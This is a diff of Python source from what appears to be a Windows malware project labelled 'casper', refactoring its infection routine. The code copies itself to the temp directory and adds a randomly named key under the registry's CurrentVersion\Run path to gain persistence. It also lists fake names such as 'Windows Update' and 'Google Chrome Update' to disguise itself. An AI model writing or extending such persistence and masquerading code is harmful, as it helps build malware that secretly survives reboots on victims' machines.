@@ -5,15 +5,6 @@ from includes import *
 
 names = ["Adobe Update","Microsoft Update","Windows Update","OneDrive Update","Acrobat Reader Plugin","Outlook Plugin","Microsoft Office Update","Google Chrome Update"]
 
-def drop():
-	"""
-	Clone myself to temp directory for storage
-	"""
-	if (clone(sys.argv[0]) == True):
-		return True
-	else:
-		return False
-
 def registry():
 	"""
 	Add registry entry with random name
@@ -29,17 +20,17 @@ def registry():
 
 def infect_registry():
 	"""
-	Infect the registry
+	Clone myself to temp directory for storage
+	and add registy key to gain persistence on
+	the system
 	"""
-	logging.debug("[casper] Attempting to add registry key under > Software\Microsoft\Windows\CurrentVersion\Run")
-	if (registry() == True):
-		logging.debug("[casper] Registry key was successfully created")
-
-		logging.debug("[casper] Dropping the file in temp directory")
-		if (drop() == True):
+	if (clone(sys.argv[0]) == True):
+		if (registry() == True):
 			logging.debug("[casper] Finished registry infection")
 			return True
 		else:
-			logging.debug("[casper] Error while dropping file at temp directory")
+			logging.debug("[casper] Error while adding registry key")
+			return False
 	else:
-		logging.debug("[casper] Error while adding registry key")
+		logging.debug("[casper] Error while cloning myself")
+		return False
